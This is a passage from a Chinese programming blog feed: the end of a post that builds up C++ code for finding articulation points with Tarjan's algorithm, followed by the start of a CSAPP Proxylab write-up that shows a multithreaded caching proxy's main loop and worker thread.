class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!visited[cur_node]) &#123;</span><br><span class="line">         visited[cur_node] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> connaected_node : graph[cur_node])&#123;</span><br><span class="line">            dfs(graph,connected_node);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在在这个框架上改：</p><ol><li><p>low,parent,dfn数组的初始化</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">const</span> <span class="built_in">vector</span>&lt;vecotr&lt;<span class="keyword">int</span>&gt;&gt; &amp;graph, <span class="keyword">int</span> from_node, <span class="keyword">int</span> to_node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> counter = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> cur_node = to_node;</span><br><span class="line"><span class="keyword">if</span>(!visited[cur_node]) &#123;<span class="comment">/* 这个作用域暂时不修改 */</span></span><br><span class="line">         visited[cur_node] = <span class="literal">true</span>;</span><br><span class="line">         parent[cur_node] = from_node;</span><br><span class="line">         dfn[cur_node] = ++counter;</span><br><span class="line">         low[cur_node] = dfn[cur_node];<span class="comment">/* low初始值和dfn相同 */</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> connected_node : graph[cur_node])&#123;</span><br><span class="line">            dfs(graph,connected_node);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>回边情况</p></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">const</span> <span class="built_in">vector</span>&lt;vecotr&lt;<span class="keyword">int</span>&gt;&gt; &amp;graph, <span class="keyword">int</span> from_node, <span class="keyword">int</span> to_node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> counter = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> cur_node = to_node;</span><br><span class="line"><span class="keyword">if</span>(!visited[cur_node]) &#123;<span class="comment">/* 第一部分：这个作用域暂时不修改 */</span></span><br><span class="line">         visited[cur_node] = <span class="literal">true</span>;</span><br><span class="line">         parent[cur_node] = from_node;</span><br><span class="line">         dfn[cur_node] = ++counter;</span><br><span class="line">         low[cur_node] = dfn[cur_node];<span class="comment">/* 第一部分：low初始值和dfn相同 */</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> connected_node : graph[cur_node])&#123;</span><br><span class="line">            dfs(graph,connected_node);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;<span class="comment">/* 第二部分：cur_node 已经是访问过的点，说明(from_node, to_node)这条边是回边，可能需要更新low数组 */</span></span><br><span class="line">        <span class="keyword">if</span>(to_node != parent[cur_node] &amp;&amp; low[from_node] &gt; dfn[to_node])&#123;</span><br><span class="line">             low[cur_node] = dfn[to_node];</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>dfs 从深节点回溯到浅节点的情况</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">const</span> <span class="built_in">vector</span>&lt;vecotr&lt;<span class="keyword">int</span>&gt;&gt; &amp;graph, <span class="keyword">int</span> from_node, <span class="keyword">int</span> to_node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> counter = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> cur_node = to_node;</span><br><span class="line"><span class="keyword">if</span>(!visited[cur_node]) &#123;<span class="comment">/* 第一部分：这个作用域暂时不修改 */</span></span><br><span class="line">         visited[cur_node] = <span class="literal">true</span>;</span><br><span class="line">         parent[cur_node] = from_node;</span><br><span class="line">         dfn[cur_node] = ++counter;</span><br><span class="line">         low[cur_node] = dfn[cur_node];<span class="comment">/* 第一部分：low初始值和dfn相同 */</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> connected_node : graph[cur_node])&#123;</span><br><span class="line">            <span class="keyword">if</span>(connected_node == from_node) <span class="keyword">continue</span>;</span><br><span class="line">            </span><br><span class="line">            dfs(graph,connected_node);</span><br><span class="line">            <span class="comment">/* 第三部分：从dfs中回溯回来 */</span></span><br><span class="line">            <span class="keyword">if</span>(low[connected_node] != dfn[parent[cur_node]] &amp;&amp;<span class="comment">/* 第三部分：子树的回边节点时间戳不是本节点的父节点的时间戳 */</span></span><br><span class="line">              low[connected_node] &lt; dfn[cur_node])&#123;<span class="comment">/*  第三部分：子树的回边节点时间戳小于当前节点的时间戳 */</span></span><br><span class="line">                 low[cur_node] = <span class="built_in">min</span>(low[cur_node],low[connected_node]);<span class="comment">/*第三部分：min函数是为了保证在cur_node的多个子树中选择最小的那个*/</span></span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(low[connected_node] &gt; dfn[cur_node])&#123;<span class="comment">/* 第三部分： 子树中存在节点必须经过cur_node才能回到上层 */</span></span><br><span class="line">                joint_node.insert(cur_node);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;<span class="comment">/* 第二部分：cur_node 已经是访问过的点，说明(from_node, to_node)这条边是回边，可能需要更新low数组 */</span></span><br><span class="line">        <span class="keyword">if</span>(to_node != parent[cur_node] &amp;&amp; low[from_node] &gt; dfn[to_node])&#123;</span><br><span class="line">             low[cur_node] = dfn[to_node];</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>root节点单独处理</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* root node单独处理 */</span></span><br><span class="line"><span class="keyword">int</span> child_num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> connected_node : link_graph[<span class="number">0</span>]) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!visited[connected_node])&#123;</span><br><span class="line">        child_num++;</span><br><span class="line">        dfs(link_graph, <span class="number">0</span>, connected_node);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(child_num&gt;=<span class="number">2</span>)&#123;</span><br><span class="line">        joint_node.insert(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>完整代码</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by raven on 2020/9/20.</span></span><br><span class="line"><span class="comment"> * 求解连通图的关键点</span></span><br><span class="line"><span class="comment"> * 书上讲解得不好</span></span><br><span class="line"><span class="comment"> * 讲解参考：https://www.cnblogs.com/nullzx/p/7968110.html</span></span><br><span class="line"><span class="comment"> * 输入： tarjan_input.txt 采用邻接链表表示</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">bool</span>&gt; visited;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; dfn;         <span class="comment">/*第一次访问到第idx个节点时的时间戳*/</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; low;         <span class="comment">/*第idx个节点及其子树能够回溯到的最小节点处的时间戳*/</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; parent;      <span class="comment">/*第idx个节点的父亲节点*/</span></span><br><span class="line"><span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; joint_node;     <span class="comment">/* 关节点 */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_link_graph</span><span class="params">(<span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; &amp;link_graph)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; link_graph.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="string">" connect to "</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; link_graph[i].<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; link_graph[i][j] &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">create_link_graph</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="built_in">string</span> <span class="title">path</span><span class="params">(<span class="string">"/home/raven/Projects/Clion/MyLeetCode/0.数据结构/6.图/tarjan_input3.txt"</span>)</span></span>;</span><br><span class="line">    <span class="function">ifstream <span class="title">fin</span><span class="params">(path)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!fin.is_open()) <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> node_num;</span><br><span class="line">    <span class="built_in">string</span> <span class="built_in">line</span>;</span><br><span class="line">    fin &gt;&gt; node_num;</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">link_graph</span><span class="params">(node_num, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;())</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (getline(fin, <span class="built_in">line</span>)) &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> i = <span class="built_in">line</span>.find_first_of(<span class="string">':'</span>);</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="built_in">std</span>::<span class="built_in">string</span>::npos) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">string</span> num_str = <span class="built_in">line</span>.substr(<span class="number">0</span>, i); <span class="comment">/* 序号 */</span></span><br><span class="line">        <span class="built_in">string</span> connect_node = <span class="built_in">line</span>.substr(i + <span class="number">1</span>, <span class="built_in">line</span>.<span class="built_in">size</span>() - i);   <span class="comment">/* 想连接的点 */</span></span><br><span class="line">        <span class="function"><span class="built_in">stringstream</span> <span class="title">sstream1</span><span class="params">(num_str)</span></span>;</span><br><span class="line">        sstream1 &gt;&gt; i;</span><br><span class="line">        <span class="function"><span class="built_in">stringstream</span> <span class="title">sstream2</span><span class="params">(connect_node)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 初始化与 i 相连的node */</span></span><br><span class="line">        <span class="keyword">int</span> temp;</span><br><span class="line">        <span class="keyword">while</span> (sstream2 &gt;&gt; temp) &#123;</span><br><span class="line">            link_graph[i].push_back(temp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> link_graph;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; &amp;link_graph, <span class="keyword">int</span> from_node, <span class="keyword">int</span> to_node)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> counter = <span class="number">0</span>;       <span class="comment">/* 时间戳 */</span></span><br><span class="line">    <span class="keyword">int</span> cur_node = to_node;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!visited[cur_node]) &#123;     <span class="comment">/* 深入到子树 */</span></span><br><span class="line">        visited[cur_node] = <span class="literal">true</span>;</span><br><span class="line">        dfn[cur_node] = ++counter;</span><br><span class="line">        low[cur_node] = dfn[cur_node];</span><br><span class="line">        parent[cur_node] = from_node;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* dfs from "cur_node" */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> connected_node: link_graph[cur_node]) &#123;</span><br><span class="line">            <span class="keyword">if</span> (connected_node == parent[cur_node]) <span class="keyword">continue</span>;    <span class="comment">/* 去掉直接相邻parent回边 */</span></span><br><span class="line"></span><br><span class="line">            dfs(link_graph, cur_node, connected_node);</span><br><span class="line">            <span class="comment">/* 从dfs回来后，已经求解到子树能够回溯到的最小节点 */</span></span><br><span class="line">            <span class="keyword">if</span> (low[connected_node] &lt; dfn[cur_node] &amp;&amp;           <span class="comment">/* 子树回边到的最小节点在本节点之上 */</span></span><br><span class="line">                low[connected_node] != dfn[parent[cur_node]]) &#123;  <span class="comment">/* 保证子树回边到的最小节点不是本节点的parent节点 */</span></span><br><span class="line">                low[cur_node] = <span class="built_in">min</span>(low[cur_node],low[connected_node]);</span><br><span class="line">            &#125; <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">if</span> (low[connected_node] &gt; dfn[cur_node]) &#123;</span><br><span class="line">                joint_node.insert(cur_node);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;          <span class="comment">/* 回边 */</span></span><br><span class="line">        <span class="keyword">if</span> (cur_node != parent[from_node] &amp;&amp; dfn[cur_node] &lt; low[from_node]) &#123;</span><br><span class="line">            low[from_node] = dfn[cur_node];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* create graph from the input file */</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; &amp;&amp;link_graph = create_link_graph();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* print result */</span></span><br><span class="line">    print_link_graph(link_graph);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* initialize global vars */</span></span><br><span class="line">    visited.resize(link_graph.<span class="built_in">size</span>());</span><br><span class="line">    dfn.reserve(link_graph.<span class="built_in">size</span>());</span><br><span class="line">    low.reserve(link_graph.<span class="built_in">size</span>());</span><br><span class="line">    parent.reserve(link_graph.<span class="built_in">size</span>());</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* tarjan algorithm */</span></span><br><span class="line">    <span class="comment">/* start from node 0 */</span></span><br><span class="line">    visited[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">    dfn[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    low[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    parent[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* root node单独处理 */</span></span><br><span class="line">    <span class="keyword">int</span> child_num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> connected_node : link_graph[<span class="number">0</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[connected_node])&#123;</span><br><span class="line">            child_num++;</span><br><span class="line">            dfs(link_graph, <span class="number">0</span>, connected_node);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(child_num&gt;=<span class="number">2</span>)&#123;</span><br><span class="line">            joint_node.insert(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* print answer */</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> node : joint_node)&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"joint node "</span> &lt;&lt; node &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-参考"><a href="#3-参考" class="headerlink" title="3. 参考"></a>3. 参考</h2><ol><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbnVsbHp4L3AvNzk2ODExMC5odG1s" title="https://www.cnblogs.com/nullzx/p/7968110.html">Tarjan算法：求解图的割点与桥（割边）<i class="fa fa-external-link"></i></span></li><li><a href="">数据结构(C语言版本)</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Csapp-Proxylab题解</title>
      <link href="/archives/5d2f135a.html"/>
      <url>/archives/5d2f135a.html</url>
      
        <content type="html"><![CDATA[<p>本次lab Proxylab。 也是csapp的最后一个lab。</p><h2 id="1-实验目的"><a href="#1-实验目的" class="headerlink" title="1.实验目的"></a>1.实验目的</h2><p>proxylab, 从最终目的来看，我们实现的是一个代理服务器。proxy接收来client的请求，转发给server，并从server中取得数据后，返回给client。另外，proxy从server中取回数据后还需要做cache，这样，当另一个client请求相同的数据时，就不用从server端请求数据，降低了server的压力。</p><p>再看看一些细节的要求，要求支持多线程请求，多线程涉及一些同步的问题，所以做的时候一定要考虑哪些是互斥资源，用什么方式同步等。</p><a id="more"></a><h2 id="2-个人实现"><a href="#2-个人实现" class="headerlink" title="2.个人实现"></a>2.个人实现</h2><p>下面是整个处理流程图：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200906094312362.png" alt="image-20200906094312362"></p><p>client向proxy请求数据，proxy将请求放入到一个任务队列中，交由子线程处理。线程负责参数解析，首先看cache中是否有满足的数据，有则直接返回给client，没有则向server请求，server返回数据后，线程将数据插入到cache中，并返回给client。</p><p>ok，整个处理流程知道后就可以开始写代码了。</p><p><strong>下文不会给出所有代码，具体代码已贴github:</strong></p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVuLWJvb2tzLXNvdXJjZS1jb2Rlcy9jc2FwcF9sYWIvYmxvYi9tYXN0ZXIvcHJveHlsYWIvcHJveHlsYWItaGFuZG91dC9wcm94eS5j" title="https://github.com/raven-books-source-codes/csapp_lab/blob/master/proxylab/proxylab-handout/proxy.c">proxy.c<i class="fa fa-external-link"></i></span></p><h3 id="1-主线程工作"><a href="#1-主线程工作" class="headerlink" title="1. 主线程工作"></a>1. 主线程工作</h3><p>先看看主线程做的工作，主线程的工作相对简单，除了一些必要的初始化工作外，只需要开启socket监听，一旦有新连接就将该连接的文件描述符(fd)放入到任务队列中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> listenfd, connfd;</span><br><span class="line">    <span class="keyword">char</span> proxy_port[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">char</span> client_hostname[BUF_SIZE];</span><br><span class="line">    <span class="keyword">char</span> client_port[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">socklen_t</span> clientlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">clientaddr</span>;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* init */</span></span><br><span class="line">    log_set_level(LOG_INFO);</span><br><span class="line">    sbuf_init(&amp;sbuf, WORKER_NUM * <span class="number">3</span>);</span><br><span class="line">    cache_init(&amp;mycache);</span><br><span class="line">    create_thread_workers(WORKER_NUM);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* parse port from cmd */</span></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"usage: %s &lt;port&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        log_error(<span class="string">"need specify proxy port\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(proxy_port, argv[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* start listen */</span></span><br><span class="line">    listenfd = Open_listenfd(proxy_port);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        clientlen = <span class="keyword">sizeof</span>(clientaddr);</span><br><span class="line">        connfd = Accept(listenfd, (SA *) &amp;clientaddr, &amp;clientlen);</span><br><span class="line">        Getnameinfo((SA *) &amp;clientaddr, clientlen, client_hostname, BUF_SIZE,</span><br><span class="line">                    client_port, BUF_SIZE, <span class="number">0</span>);</span><br><span class="line">        log_info(<span class="string">"Accepted connection from (%s, %s)\n"</span>, client_hostname,</span><br><span class="line">                 client_port);</span><br><span class="line">        <span class="comment">/* put task into task queue */</span></span><br><span class="line">        sbuf_insert(&amp;sbuf, connfd);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* free resource  */</span></span><br><span class="line">    cache_deinit(&amp;mycache);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-子线程工作"><a href="#2-子线程工作" class="headerlink" title="2. 子线程工作"></a>2. 子线程工作</h3><p>子线程从任务队列中获取一个“任务“，然后doit</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">thread_routinue</span><span class="params">(<span class="keyword">void</span> *vargs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> connfd;</span><br><span class="line">    pthread_detach(pthread_self());</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        connfd = sbuf_remove(&amp;sbuf);</span><br><span class="line">        doit(connfd);</span><br><span class="line">        <span class="built_in">close</span>(connfd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span 